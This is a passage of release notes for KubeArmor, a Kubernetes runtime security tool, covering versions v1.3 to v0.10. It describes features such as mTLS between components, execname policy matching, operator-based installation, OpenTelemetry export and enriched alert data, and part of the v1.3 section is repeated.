In previous versions of KubeArmor, communication between the KubeArmor server and clients (e.g., kubearmor-relay, kubearmor-client) was unencrypted, potentially exposing sensitive information or allowing unauthorized access to the communication channel. To address this security concern, KubeArmor now supports secure gRPC communication between the KubeArmor server and clients using mutual TLS (mTLS). This enhancement ensures that all communication between KubeArmor components is encrypted and only trusted parties can connect with KubeArmor.

#### Vulnerabilities

Many critical vulnerabilities across KubeArmor images have been addressed, ensuring the overall security of the KubeArmor deployment and protecting against potential exploits or vulnerabilities.

**References:** [KubeArmor Security Enhancements](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/kubearmor-security-enhancements.md)

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1186>

**PRs:**

* <https://github.com/kubearmor/KubeArmor/pull/1526>
* <https://github.com/kubearmor/KubeArmor/pull/1661>

### Additional Columns for KubeArmor Policies

Previously, when listing KubeArmor Security Policies (KSPs) and Host Security Policies (HSPs) using kubectl get, users only had access to limited information about each policy, making it challenging to quickly assess the purpose and impact of each policy. To improve visibility and usability, policy status now includes additional columns. These columns display the action (Allow/Audit/Block) and severity level for each policy. This enhancement allows users to quickly identify the intended behavior and potential impact of each policy, facilitating easier policy management and enabling more informed decision-making when deploying or updating security policies within their Kubernetes environment.

**References:**

![image](https://github.com/kubearmor/KubeArmor/assets/54525605/aa7d53e9-d268-4975-a104-3db36a3461ff)

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1326https://github.com/dqsully>

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1683>

### Support for Alibaba Cloud

As Kubernetes adoption continues to grow, organizations are increasingly leveraging various cloud providers to host their deployments. Previously, KubeArmor lacked official support for Alibaba Cloud deployments, which could pose challenges for users seeking to secure their Kubernetes workloads running on Alibaba Cloud's infrastructure. To address this gap, KubeArmor now officially supports Alibaba Cloud deployments, including Alibaba Cloud Kubernetes (ACK) and Elastic Compute Services (Virtual Machines). This support ensures that KubeArmor can be seamlessly deployed and integrated with Alibaba Cloud environments, providing robust security for your Kubernetes workloads running on Alibaba Cloud. With this addition, KubeArmor expands its reach and enables organizations leveraging Alibaba Cloud to benefit from its advanced security capabilities, ensuring consistent protection across various cloud platforms. The latest image of Alibaba Cloud Linux 3 contains BPF-LSM enabled by default as part of the kernel config but not enabled by default as part of the boot parameter. Thus the user has to enable BPF-LSM boot for all the nodes for which they desire to secure with KubeArmor. Checkout the FAQ for [Checking And Enabling Support For BPF LSM](https://docs.kubearmor.io/kubearmor/documentation/faq#checking-and-enabling-support-for-bpf-lsm).

### Performance Improvements

In large-scale Kubernetes deployments with numerous nodes and pods, the overhead associated with listing and watching all resources can significantly impact performance and scalability. Previously, each KubeArmor DaemonSet pod listed and watched every node and pod in the cluster, leading to potential performance bottlenecks and resource constraints as the cluster grew larger. To address this performance concern, KubeArmor now filters watched nodes and pods server-side, reducing overhead significantly in large clusters. Instead of each KubeArmor DaemonSet pod listing and watching every node and pod in the cluster, KubeArmor now specifies the nodes and pods of interest for each DaemonSet. This optimization enhances the overall performance and scalability of KubeArmor in large-scale Kubernetes deployments, ensuring efficient resource utilization and enabling smoother operations in resource-constrained environments. Special thanks to [dqsully](https://github.com/dqsully) for recognizing and fixing this!

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1676>

# v1.3

v1.3.0 release includes new improvements to enhance the security, usability, and performance of KubeArmor along with some bug fixes. We list major changes below.

[KubeArmor Operator as the Default Installation Method](#kubearmor-operator-as-the-default-installation-method)

[Capabilities Enforcement with BPF LSM](#capabilities-enforcement-with-bpf-lsm)

[Execname Matching in KubeArmor Policies](#execname-matching-in-kubearmor-policies)

[Securing KubeArmor](#securing-kubearmor)

[Additional Columns for KubeArmor Policies](#additional-columns-for-kubearmor-policies)

[Support for Alibaba Cloud](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/release-notes/support-for-alibaba-cloud/README.md)

[Performance Improvements](#performance-improvements)

## Key Takeaways

* KubeArmor Operator is now the default installation method for KubeArmor, providing a more streamlined installation process.
* New features include support for capabilities enforcement using BPF LSM, execname matching in policies, and additional columns in KubeArmor Security Policies (KSPs) and Host Security Policies (HSPs).
* Security enhancements include securing KubeArmor itself with Seccomp profiles and implementing mutual TLS (mTLS) for secure gRPC communication
* Support for Alibaba Cloud deployments has been added.
* Performance improvements include filtering watched nodes and pods server-side to reduce overhead in large clusters.

### KubeArmor Operator as the Default Installation Method

Earlier we used to install KubeArmor through plain Kubernetes manfiests. In kubearmor-client a.k.a karmor, we had a heurisitics based mechanism for detecting the target environment and create KubeArmor manifests accordingly. In recent releases we've developed the KubeArmor Operator - a Kubernetes operator which gets the granular per-node configuration of target environments and accordingly creates KubeArmor manifests. We have been pushing on operator based installation, make it more stable and slowly migrating our docs and references to point towards it instead of the old method. Finally, with this release - we now have karmor using the operator based installation too.

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1256>

**PRs:** <https://github.com/kubearmor/kubearmor-client/pull/402>

### Capabilities Enforcement with BPF LSM

In Kubernetes environments, certain workloads may require specific Linux capabilities to function correctly. However, granting unnecessary capabilities can introduce security risks. Previously, KubeArmor had the ability to enforce policies on Linux capabiliites only when using the AppArmor enforcer, recently we've introduced the same in our distinguishing BPF LSM enforcer as well. This improves the feature parity between AppArmor and BPF-LSM and allows you to define policies that restrict or allow specific capabilities for your workloads, enhancing the overall security posture of your Kubernetes cluster.

**References:** [Restrict Capabilities Usecase](https://docs.kubearmor.io/kubearmor/use-cases/hardening#restrict-capabilities-do-not-allow-capabilities-that-can-be-leveraged-by-the-attacker)

**Issues:**

* <https://github.com/kubearmor/KubeArmor/issues/795>
* <https://github.com/kubearmor/KubeArmor/issues/1538>

**PRs:**

* <https://github.com/kubearmor/KubeArmor/pull/1543>

### Execname Matching in KubeArmor Policies

Identifying and blocking malicious or unauthorized applications running in your Kubernetes cluster can be a challenging task, especially when dealing with dynamic or obfuscated binaries. Previously, KubeArmor relied solely on file paths or other attributes to define policies, limiting its ability to detect and prevent the execution of specific binaries. To address this limitation, KubeArmor now supports matching executable names in its policies. This new feature enables you to create rules based on the name of the executable binary, allowing for more granular control over the applications running in your Kubernetes cluster. For example, you can now block or allow specific crypto-mining binaries like xmrig by matching their executable names. By introducing execname matching, KubeArmor provides an additional layer of security and control, enabling you to proactively detect and prevent the execution of known malicious or unauthorized binaries within your Kubernetes environment.

**References:** [Example Policy](https://github.com/kubearmor/KubeArmor/blob/main/tests/k8s_env/ksp/multiubuntu/ksp-ubuntu-1-block-proc-execname.yaml)

**Discussion:** <https://kubearmor.slack.com/archives/C01F9V3SEHY/p1709480346589829>

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1664>

### Securing KubeArmor

As a security project, it's crucial for KubeArmor itself to adhere to security best practices and minimize its attack surface. For this, we've been constantly making improvements through past releases. In this release

#### Seccomp

KubeArmor will now ship with a default seccomp profile of it's own to restrict the system calls it can make. The profile won't be activated by default as of now but in future releases we'll make it enabled by default.

#### Secure gRPC Communication with Mutual TLS

In previous versions of KubeArmor, communication between the KubeArmor server and clients (e.g., kubearmor-relay, kubearmor-client) was unencrypted, potentially exposing sensitive information or allowing unauthorized access to the communication channel. To address this security concern, KubeArmor now supports secure gRPC communication between the KubeArmor server and clients using mutual TLS (mTLS). This enhancement ensures that all communication between KubeArmor components is encrypted and only trusted parties can connect with KubeArmor.

#### Vulnerabilities

Many critical vulnerabilities across KubeArmor images have been addressed, ensuring the overall security of the KubeArmor deployment and protecting against potential exploits or vulnerabilities.

**References:** [KubeArmor Security Enhancements](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/kubearmor-security-enhancements.md)

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1186>

**PRs:**

* <https://github.com/kubearmor/KubeArmor/pull/1526>
* <https://github.com/kubearmor/KubeArmor/pull/1661>

### Additional Columns for KubeArmor Policies

Previously, when listing KubeArmor Security Policies (KSPs) and Host Security Policies (HSPs) using kubectl get, users only had access to limited information about each policy, making it challenging to quickly assess the purpose and impact of each policy. To improve visibility and usability, policy status now includes additional columns. These columns display the action (Allow/Audit/Block) and severity level for each policy. This enhancement allows users to quickly identify the intended behavior and potential impact of each policy, facilitating easier policy management and enabling more informed decision-making when deploying or updating security policies within their Kubernetes environment.

**References:**

![image](https://github.com/kubearmor/KubeArmor/assets/54525605/aa7d53e9-d268-4975-a104-3db36a3461ff)

**Issues:** <https://github.com/kubearmor/KubeArmor/issues/1326https://github.com/dqsully>

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1683>

### Support for Alibaba Cloud

As Kubernetes adoption continues to grow, organizations are increasingly leveraging various cloud providers to host their deployments. Previously, KubeArmor lacked official support for Alibaba Cloud deployments, which could pose challenges for users seeking to secure their Kubernetes workloads running on Alibaba Cloud's infrastructure. To address this gap, KubeArmor now officially supports Alibaba Cloud deployments, including Alibaba Cloud Kubernetes (ACK) and Elastic Compute Services (Virtual Machines). This support ensures that KubeArmor can be seamlessly deployed and integrated with Alibaba Cloud environments, providing robust security for your Kubernetes workloads running on Alibaba Cloud. With this addition, KubeArmor expands its reach and enables organizations leveraging Alibaba Cloud to benefit from its advanced security capabilities, ensuring consistent protection across various cloud platforms. The latest image of Alibaba Cloud Linux 3 contains BPF-LSM enabled by default as part of the kernel config but not enabled by default as part of the boot parameter. Thus the user has to enable BPF-LSM boot for all the nodes for which they desire to secure with KubeArmor. Checkout the FAQ for [Checking And Enabling Support For BPF LSM](https://docs.kubearmor.io/kubearmor/documentation/faq#checking-and-enabling-support-for-bpf-lsm).

### Performance Improvements

In large-scale Kubernetes deployments with numerous nodes and pods, the overhead associated with listing and watching all resources can significantly impact performance and scalability. Previously, each KubeArmor DaemonSet pod listed and watched every node and pod in the cluster, leading to potential performance bottlenecks and resource constraints as the cluster grew larger. To address this performance concern, KubeArmor now filters watched nodes and pods server-side, reducing overhead significantly in large clusters. Instead of each KubeArmor DaemonSet pod listing and watching every node and pod in the cluster, KubeArmor now specifies the nodes and pods of interest for each DaemonSet. This optimization enhances the overall performance and scalability of KubeArmor in large-scale Kubernetes deployments, ensuring efficient resource utilization and enabling smoother operations in resource-constrained environments. Special thanks to [dqsully](https://github.com/dqsully) for recognizing and fixing this!

**PRs:** <https://github.com/kubearmor/KubeArmor/pull/1676>

# v1.1

* KubeArmor on RedHat Ecosystem #1294 ✅
* list the applied policies for unorchestrated workloads #1311 ✅
* Use Enforcer as a source of Alerts #1277 ✅
* Disable file visibility by default #1442 ✅
* KubeArmor on Flatcar feedback #1265 ✅
* Create PolicyReports for security events to use with Policy Reporter #1337 ✅ #1328
* CEF format support #1371 ✅ #1328
* handle policy addition and deletion in systemd mode. #1312 ✅
* kubearmor packer provisioner #3 ✅
* K0s Support for KubeArmor #1318 ✅
* Install KubeArmor in the "kubearmor" namespace by default #1167 ✅
* adding cwd in alerts/telemetry #1453 ✅
* Nephio Integration
* MicroShift Support #1325
* Prebuilt 5G Security controls from MITRE FiGHT and ENISA
* Modify Sidekick to export KubeArmor events #1328 ✅
* Performance Improvement

## Boost Confidence with Red Hat OpenShift Certified KubeArmor Operator @rksharma95

![Boost Confidence](https://github.com/kubearmor/KubeArmor/assets/68660002/96f7a7e2-7c01-4cc7-8027-7871d7cdd73c)

Ensuring compatibility, security, and trustworthiness is crucial in today's containerised world. That's where Red Hat OpenShift Product Certification for the KubeArmor Operator comes in. This certification provides approval, signifying that KubeArmor is rigorously tested and verified to work seamlessly with OpenShift in production environments.

## Improved support for Kubearmor-client in Systemd Mode @Aryan-sharma11

### Applying policies via kubearmor-client

![Improved Policy Handling in Systemd](https://github.com/kubearmor/KubeArmor/assets/68660002/17d9ec79-8046-4e39-bc45-13f492e6e354)

In systemd mode, karmor is getting an upgrade to handle policy addition and deletion better. The current behaviour can be confusing, as it always returns a "SUCCESS" message, even when adding a policy already applied or deleting a policy that doesn't exist.

1. **Policy Addition**: If you try to apply a policy already in effect, karmor will tell you, "Policy is already applied."
2. **Policy Deletion**: If you attempt to delete a policy that doesn't exist, the response will indicate that the "Policy doesn't exist."

These enhancements include a new check to ensure that policies are received by the gRPC client and successfully applied by the ParseAndUpdate functions. This makes karmor more reliable and user-friendly when managing policies in systemd mode. In the containerization landscape, orchestrated workloads receive much attention, but unorchestrated workloads are equally important. Often running in Systemd mode, unmanaged containers can benefit from a policy management approach. One effective tool is the Karmor Probe, which helps ensure security and compliance.

![Managing Policies](https://github.com/kubearmor/KubeArmor/assets/68660002/6fd3189c-efcc-4027-aa10-860561050bb6)

### Karmor Probe for Unorchestrated Workloads

1. Using a gRPC Endpoint

* Set up a gRPC endpoint within your unorchestrated environment to query and list policies applied to workloads.
* This allows you to integrate Karmor Probe seamlessly and maintain the same standards for unorchestrated and orchestrated workloads.

1. Systemd Mode Workloads

* Unorchestrated workloads in Systemd mode can be managed by leveraging Systemd commands and unit files.
* Use Systemd-specific tools to inspect policies and maintain clear documentation for each service.

In conclusion, maintaining policies for unorchestrated workloads is essential for a comprehensive container environment. Karmor Probe and a strategic approach help ensure security and compliance for all your containers, regardless of orchestration.

## Streamlining Kubernetes Security with KubeArmor Enforcer Alerts @daemon1024 @Aryan-sharma11

KubeArmor's latest feature request aims to reduce confusion by using alerts sent by the KubeArmor enforcer, rather than triggering Default Posture alerts when no permissions are denied. This enhancement simplifies Kubernetes security and provides more accurate information to users.

![Streamlining Kubernetes Sec (Medium)](https://github.com/kubearmor/KubeArmor/assets/68660002/127b69c1-12d2-4f49-b2d6-b1b48b370fae)

In the world of Kubernetes security, minimizing confusion is a priority. KubeArmor's proposed solution involves setting up a Ring Buffer Infrastructure in the BPF LSM Enforcer to manage alerts more effectively. Here's how it works:

The Solution:

1. **Ring Buffer Infrastructure**: KubeArmor creates a ring buffer in the kernel space to store and manage alerts.
2. **Alert Handling**: Alerts are generated when permissions are denied, containing crucial information about the denial.
3. **User-Friendly Alerts**: Only genuine security alerts are triggered, reducing unnecessary Default Posture alerts.

Benefits:

* **Reduced Confusion**: Users won't be bombarded with false alarms.
* **Enhanced Usability**: Security monitoring becomes more straightforward.
* **Improved Resource Utilization**: Fewer alerts mean more efficient resource usage.

Conclusion: KubeArmor's feature request promises a simpler and more user-friendly Kubernetes security experience by focusing on real security events and minimizing noise. This development contributes to a robust and effective Kubernetes security solution.

## Enhanced Security with Disabled File-Based Telemetry by Default @Ankurk99

KubeArmor has significantly updated by **disabling file-based telemetry by default**. This modification substantially decreases telemetry data generated by file events, lowering overall resource consumption. Users have the flexibility to configure these changes and can effortlessly enable visibility as needed. ![Enhanced Security with Disabled](https://github.com/kubearmor/KubeArmor/assets/68660002/aceea405-cf09-4ad5-ad3e-3091f92550ad)

## Enhancing KubeArmor on Flatcar OS @daemon1024

KubeArmor recently underwent testing on Flatcar OS, leading to valuable feedback and feature requests. Key details include a missing `/usr/src` directory on Flatcar OS, which prompted the suggestion to make its location optional. Additionally, enabling BPF-LSM was found to be crucial and is now clarified in the documentation. ![image](https://github.com/kubearmor/KubeArmor/assets/68660002/31d8830a-4e9c-485d-a8ae-25d76b133451)

KubeArmor has responded with enhancements, including the KubeArmor Operator for smoother deployments and a new FAQ section on [enabling BPF-LSM](https://docs.kubearmor.io/kubearmor/documentation/faq#checking-and-enabling-support-for-bpf-lsm). These updates reflect the project's commitment to improving container security and user experience.

## Improved Policy Handling in Systemd Mode @Aryan-sharma11

## Simplify Kubernetes Security with KubeArmor Packer Provisioner @Prateeknandle

![Simplify Kubernetes Security with KubeArmor Packer](https://github.com/kubearmor/KubeArmor/assets/68660002/75b6342b-40a4-414a-94f0-e5da3ecb2a8e)

In the world of Kubernetes security, KubeArmor is a game-changer. But installing it can be complex. That's where the Kubearmor Packer Provisioner comes in. It offers:

1. Ansible Playbook: An automated way to install KubeArmor, Karmor, and dependencies, ensuring consistency.
2. Packer Integration: Seamlessly integrates with Packer for image creation, so your Kubernetes cluster comes pre-configured with Kubearmor and Karmor.

With this provisioner, you can fortify your Kubernetes security effortlessly and efficiently, saving time and reducing the risk of misconfigurations.

## KubeArmor Adds Support for K0s: Boosting Kubernetes Security @anurag-rajawat

K0s is known for its simplicity and efficiency, making it a preferred choice for some Kubernetes users. With KubeArmor's support, K0s users can now benefit from advanced security features while keeping their clusters lightweight.

![KubeArmor Adds Support for K0s](https://github.com/kubearmor/KubeArmor/assets/68660002/2f6d52d2-d11d-4b6c-be8f-70e735af715b)

Key Benefits:

1. Enhanced Security: K0s users can apply fine-grained security policies to container workloads, improving protection against threats.
2. Increased Flexibility: Integrating K0s support expands choices for securing Kubernetes environments.
3. Growing Ecosystem: It contributes to the diversity and adaptability of the Kubernetes ecosystem.

KubeArmor's support for K0s is a valuable addition that enhances Kubernetes security options. Whether you're already using K0s or considering it, explore the benefits of KubeArmor's security solutions for your containerized workloads.

## Enhancing Container Security with BPF LSM and KubeArmor @daemon1024

![Enhancing Container Security with BPF LSM and KubeArmor](https://github.com/kubearmor/KubeArmor/assets/68660002/79441534-e75f-44ee-8939-038968231d13)

Containerization and Kubernetes have transformed application deployment, but security remains a concern. KubeArmor, an open-source project, leverages BPF LSM (Linux Security Modules) to enforce host policies for stronger Kubernetes security.

Containers share the host kernel, making them vulnerable. KubeArmor addresses this by enforcing fine-grained host policies that boost security.

BPF LSM combines BPF's power with LSM's security framework to make real-time policy decisions and enforcement possible—enhanced Security with KubeArmor. KubeArmor delivers real-time policy enforcement, host-level policies, fine-grained control, auditing, and seamless Kubernetes integration. KubeArmor's innovative use of BPF LSM enhances security in Kubernetes environments, protecting containerized applications and ensuring compliance.

## Installing KubeArmor in the "kubearmor" Namespace @Ankurk99

The `kube-system` namespace is used for objects created by the Kubernetes system. It is reserved for system-level resources and components critical to the cluster's functioning. Installing any external deployments with the system's essential resources is not recommended. In this release, we have modified the default namespace for KubeArmor to utilize `kubearmor`.

## Streamlining Kubearmor Event Export with Sidekick Integration @Shreyas220

Exporting Kubearmor security events to various outputs is essential for effective Kubernetes security management. Discover how integrating Falcosidekick can simplify this process. It's a vital tool for securing Kubernetes clusters, but handling the export of security events can be challenging. We have integrated Falcosidekick to seamlessly export Kubearmor events to multiple outputs like email, Slack, Redis, RabbitMQ, Kafka, and more. Falcosidekick acts as a bridge, receiving events from Kubearmor and forwarding them to your chosen destinations. This integration allows you to customize event routing, receive real-time alerts, and ensure scalability and reliability. ![Streamlining Kubearmor](https://github.com/kubearmor/KubeArmor/assets/68660002/c493e719-7749-4b9c-9ce4-9b60cf8a726e)

The Kubearmor and Falcosidekick integration simplifies exporting security events, enhancing your ability to manage and respond to Kubernetes security incidents effectively.

## Leveraging eBPF for Current Working Directory (CWD) in Alerts @Prateeknandle

Introduction

In this blog, we'll explore using eBPF to capture a process's Current Working Directory (CWD) and include this information in your system alerts and telemetry. CWD is valuable for debugging, troubleshooting, security, and compliance.

Why CWD Matters

* Debugging: Helps identify file access, permissions, and dependencies issues.
* Troubleshooting: Contextual information for efficient issue diagnosis.
* Security: Detects suspicious activities related to directory access.
* Compliance: Provides context for auditing and compliance requirements.

Adding CWD to Alerts and Telemetry

1. Write an eBPF program to capture CWD.
2. Extract CWD information from process data structures.
3. Send CWD data to your logging or alerting system.
4. Correlate CWD data with other observability metrics.

![image](https://github.com/kubearmor/KubeArmor/assets/68660002/c47b41da-46de-4d69-8942-47469f153900)

Benefits

* Faster Issue Resolution: Speed up troubleshooting.
* Enhanced Security: Detect unauthorized activities.
* Compliance: Meet regulatory requirements.
* Improved Resource Utilization: Optimize system resources.

Incorporating CWD data through eBPF empowers better system observability and performance analysis.

# v0.11

We're thrilled to introduce the latest release of KubeArmor, version v0.11! This significant update reinforces our commitment to providing top-tier container-level security for Kubernetes deployments. With an array of new features, integrations, and improvements, KubeArmor v0.11 empowers you to achieve even greater security and control over your containerized workloads. Let's delve into the key highlights of this release:

## Operator support: Simplifying Management and Deployment

![](https://github.com/kubearmor/KubeArmor/assets/9133227/6bfe1636-cbce-49b3-8ae5-3df01c94510a)

KubeArmor v0.11 comes with robust operator support, making the installation, configuration, and management of KubeArmor instances a breeze. The KubeArmor Operator streamlines the deployment process, enabling you to efficiently set up and maintain KubeArmor across your Kubernetes clusters. Embrace simplicity and consistency in managing your security policies.

Elements of KubeArmor Operator design:

* **Operator**: Operator is the initial component that gets deployed as part of helm based installation. The job of the operator is to reconcile the current state of KubeArmor to its intended state.
* **Snitch**: Snitch is a job deployed by operator to check what is the prevalent LSM (Linux Security Modules) and the container runtime on each of the node. Snitch then directs the KubeArmor daemonset to use these parameters to accordingly use the appropriate enforcer and container runtime primitives.
* **bpf-containerd**: This is essentially the KubeArmor daemonset that does most of the work from observability to policy enforcement. Note that the name of the daemonset is dependent on the underlying enforcer (bpf, apparmor) that is used and the container runtime that is detected.
* **Relay**: KubeArmor Relay connects to each of the daemonset and collects the alerts/telemetry/log and makes it available at single GRPC endpoint. External services can connect to KubeArmor Relay to gets the alerts/telemetry from a single point. Relay is available as a k8s deployment/service.
* **Controller**: KubeArmor controller reconciles the KubeArmor policies. One of the biggest advantage of KubeArmor is its use of k8s-native design for policy management. Users can enable disable policies at will by applying/deleting the policies at runtime. This enables a wide range of possibilities such as time-based policy activation.

## OpenTelemetry

![](https://github.com/kubearmor/KubeArmor/assets/9133227/4f98fc7c-2c5c-4200-b3e4-9f4fb78ce26a)

The [OpenTelemetry KubeArmor](https://github.com/kubearmor/otel-adapter) adapter converts KubeArmor telemetry data (logs, visibilty events, policy violations) to the openTelemetry format. This [adds opentelemetry support to KubeArmor](https://github.com/kubearmor/KubeArmor/issues/894) providing a vendor agnostic means of exporting KubeArmor's telemetry data to various observability backend such as [elastic search](https://www.elastic.co/guide/en/apm/guide/current/open-telemetry-direct.html#connect-open-telemetry-collector), [grafana](https://grafana.com/docs/opentelemetry/collector/), [signoz](https://signoz.io/blog/opentelemetry-apm/) and a bunch of other [opentelemetry adopters](https://github.com/open-telemetry/community/blob/main/ADOPTERS.md)!

To enhance your observability capabilities, KubeArmor now seamlessly integrates with Open Telemetry. Gain unparalleled insights into container behavior and workload interactions through comprehensive telemetry data collection. With this integration, you'll be equipped to make informed decisions, swiftly identify anomalies, and proactively address potential security threats.

Credits: Amazing work by [Maureen Ononiwu](https://github.com/Chinwendu20) for handling KubeArmor's OpenTelemetry integration as part of LFX Mentorship. :rocket:

## Announcing k8tls (pronounced cattles): k8s service endpoints TLS best practices assessment

![](https://github.com/kubearmor/KubeArmor/assets/9133227/49ae41fe-a724-41d0-b8f1-d5b3b8bf778b)

Security extends beyond containers. KubeArmor v0.11 introduces [k8tls](https://github.com/kubearmor/k8tls) to bolster transport layer security within Kubernetes clusters. Safeguard your communications with enhanced encryption, safeguarding your data and ensuring the confidentiality of sensitive information.

[K8tls](https://github.com/kubearmor/k8tls) is a k8s-native service endpoint scanning engine that verifies whether the endpoint is using secure communication and is using right security configuration. K8tls deploys itself as a k8s job that scans/fingerprints k8s service endpoints to identify if TLS best practices are followed. Primary features include:

* 🔒 Check if the server port is TLS enabled or not.
* 📃 Check TLS version, Ciphersuite, Hash, and Signature for the connection. Are these TLS parameters per the TLS best practices guide?
* Certificate Verification
  * 💥 Is the certificate expired or revoked?
  * ✍️ Is it a self-signed certificate?
  * ⛓️ Is there a self-signed certificate in the full certificate chain?

## KubeArmor as Canonical Microk8s Addon

![](https://github.com/kubearmor/KubeArmor/assets/9133227/89262b47-6119-4ec3-8e52-b8df41831fd4)

Microk8s is a full embedded Kubernetes platform that is lightweight yet robust and scalable and is a perfect fit for edge, embedded scenarios. KubeArmor support for Canonical MicroK8s as [a community addon](https://github.com/canonical/microk8s-community-addons/pull/147) is merged making microk8s more secure. Microk8s with KubeArmor brings enterprise grade security to lightweight edge kubernetes environments.

## Kind and Minikube Compatibility

With this release, KubeArmor extends its compatibility to Kind and Minikube clusters, enabling you to effortlessly apply KubeArmor's security policies to your local testing and development environments. Maintain consistency between testing and production while fortifying your workloads.

![](https://github.com/kubearmor/KubeArmor/assets/14152150/833b7bd2-dee9-4436-8c73-a0a4e2c09387) ![](https://github.com/kubearmor/KubeArmor/assets/14152150/81269e2c-38cb-4a97-b898-b1f673eced52)

## karmor profile

`karmor logs` tool provides raw telemetry out of the box. However, you may want to summarize the process, file, network, syscall events over a period of time. `karmor profile` introduces a way to handle the summarization. KubeArmor community followers might realize that the base `profile` feature was added in v0.8 release. v0.11 vastly improves the usability of the features, for e.g, by sorting the data based on process name, summarizing/aggregating well, adding syscall related event summarization etc.

![karmorprofile](https://github.com/kubearmor/KubeArmor/assets/23097199/f0aba5a0-7ef3-4ee3-88e6-4d4022031c67)

## EKS Addon published: Simplifing EKS deployment

![](https://github.com/kubearmor/KubeArmor/assets/9133227/bc17c1a7-507e-4d07-850a-6cc4f9247f5b)

Amazon EKS Anywhere allows installing and managing Kubernetes clusters on your own infrastructure, with optional support from AWS. EKS Anywhere supports full lifecycle management of multiple Kubernetes clusters that can operate completely independently of any AWS services. It provides open-source software that’s up to date and patched so you can have an on-premises Kubernetes environment that’s more reliable than a self-managed Kubernetes offering. EKS Anywhere is compatible with Bare Metal, CloudStack, and VMware vSphere as deployment targets.

Although EKS Anywhere can make cluster administration easier, the issue of protecting how Kubernetes namespaces, pods, workloads, and clusters interaction and access of shared resources remains an unsolved problem. It is imperative that workloads are protected at runtime since most of the attacks such as cryptomining, ransomware, data exfiltration, denial of service are manifest once the workloads are deployed in target k8s environment.

In line with the recommended safety guidelines for EKS, KubeArmor comprehensively fulfills these requirements. Getting up to speed on the Kubernetes threat environment proves to be difficult for security teams. New responsibilities for Kubernetes infrastructure and workloads lead to high overhead. Furthermore, ensuring that platform and application teams have consistency and complete visibility across environments for configurations and settings to fulfill [AWS EKS security best practices](https://www.trendmicro.com/cloudoneconformity-staging/knowledge-base/aws/EKS/) can be difficult. KubeArmor helps you take care of most of these for you.

## Streamlined Deployment: Updated Helm Chart

Deploying KubeArmor has never been smoother. The updated Helm chart simplifies the installation process, ensuring that you can effortlessly manage KubeArmor's security policies across your Kubernetes clusters. Spend less time configuring and more time securing. Use of KubeArmor Operator greatly simplifies the auto detection of cluster components and deploying the kubearmor accordingly. For example, no more mounting of unwanted host mount points to just detect the container runtime in use.

## Staying in Sync with Infrastructure: Terraform Updates

For those who embrace infrastructure-as-code, KubeArmor v0.11 offers updated Terraform integration. Seamlessly incorporate KubeArmor into your Terraform workflows, ensuring consistent security provisioning throughout your infrastructure.

Open source [KubeArmor terraform provider from AccuKnox](https://github.com/accuknox/terraform-provider-accuknox#example---kubearmor-resources) helps provision KubeArmor deployments, policies, and configuration at scale using Hashicorp Terraform.

## Pushing Boundaries: Scale Testing with KubeArmor-Relay

Scalability is of paramount importance. One of primary hurdle to observability/monitoring solutions is its impact on runtime performance. With v0.11, we tested logging/telemetry components such as KubeArmor-Relay for scale of 100s of nodes. Through rigorous testing under varying workloads, KubeArmor v0.11 ensures unwavering performance even in the most dynamic Kubernetes environments.

## Flourishing Ecosystem: Adopters Update

Our [community of adopters](https://github.com/kubearmor/KubeArmor/blob/main/ADOPTERS.md) continues to grow, and we're immensely grateful for your support. Join a vibrant community of users and contributors who are shaping the future of container security. Together, we're elevating Kubernetes security to new heights.

## Thanks/Credits

We extend our gratitude to our dedicated community, whose feedback and contributions drive the evolution of KubeArmor. Dive into the cutting-edge security enhancements of KubeArmor v0.11 and fortify your Kubernetes environment with confidence.

To explore the latest features and embark on your journey with KubeArmor v0.11, visit our [official GitHub repository](https://github.com/kubearmor/kubearmor) and [comprehensive documentation](https://docs.kubearmor.io/kubearmor/).

Secure your containers, fortify your Kubernetes clusters — experience KubeArmor v0.11 today.

Stay secure, The KubeArmor Team

# v0.10

Security update! Announcing the release of KubeArmor v0.10, packed with exciting new features, enhancements, and fixes. This release brings improved default visibility settings, enriched telemetry, and alert data, support for new platforms, and various installation fixes. The community has collaboratively worked to deliver a solid new release. Let’s get into the details of what's new in KubeArmor v0.10:

## Enrichment of Telemetry and Alerts Data

For better visibility, alerts, and telemetry, KubeArmor now includes Deployment Name, Pod Name, Namespace, and Cluster Name. This strategy improves analysis and monitoring, allowing for comprehensive deployments and effective troubleshooting. Added support for deployment scenarios (replicasets, statefulsets, daemonset). This makes it easier for you to base decisions on accurate metadata. You can now expect even more detailed and insightful information, empowering you to monitor and analyze your workloads with greater precision.

```json
{
  "Timestamp": 1679588263,
  "UpdatedTime": "2023-03-23T16:17:43.146109Z",
  "ClusterName": "default",
  "HostName": "prateek-lenovo-ideapad-310-15isk",
  "NamespaceName": "default",
  "Owner": {
    "Ref": "DaemonSet",
    "Name": "my-daemonset",
    "Namespace": "default"
  },
  "PodName": "my-daemonset-xhrr9",
  "Labels": "app=my-app",
  "ContainerID": "0e6a98ec00521ed92fd29664ae238f60463a93b819e6c54a4494cf371e63e86a",
  "ContainerName": "my-container",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:1ed4dff2b99011798f2c228667d7cb4f4e2bd76b2adc78fd881d39f923e78c9d",
  "HostPPID": 671928,
  "HostPID": 672009,
  "PPID": 41,
  "PID": 46,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/bin/sleep",
  "PolicyName": "new",
  "Severity": "5",
  "Message": "block /bin/sleep",
  "Type": "MatchedPolicy",
  "Source": "/bin/bash",
  "Operation": "Process",
  "Resource": "/bin/sleep",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "Action": "Block",
  "Result": "Permission denied"
}
```

Note the availability of `owner` nested json in the above telemetry event that provides details about the owner references that generated this telemetry event.

## Support for BPF-LSM in Non-Orchestrated Containerized Workloads

